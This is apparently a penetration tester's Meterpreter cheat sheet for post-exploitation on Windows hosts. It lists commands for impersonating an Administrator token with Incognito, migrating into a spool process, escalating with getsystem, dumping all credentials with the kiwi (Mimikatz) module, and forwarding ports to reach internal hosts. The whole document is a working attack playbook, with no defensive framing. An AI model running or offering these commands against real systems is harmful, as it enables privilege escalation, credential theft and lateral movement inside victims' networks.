### Incognito 
```
mtr> load incognito
mtr> list_tokens -u
mtr> impersonate_token APT\\Administrator
```

### Drop token
```
mtr> drop_token
```

### Migrate to x64 process
```
mtr> ps
mtr> migrate <spoolId>
```

### Get user id
```
mtr> getuid
```

### Mimikatz
```
mtr> getsystem
mtr> load kiwi
mtr> creds_all
```

### Port forwarding - the target ip is the host whih can not be reached from the outside of the network
```
mtr> portfwd add –l <listenPort> –p <remotePort> –r <rhost>
```

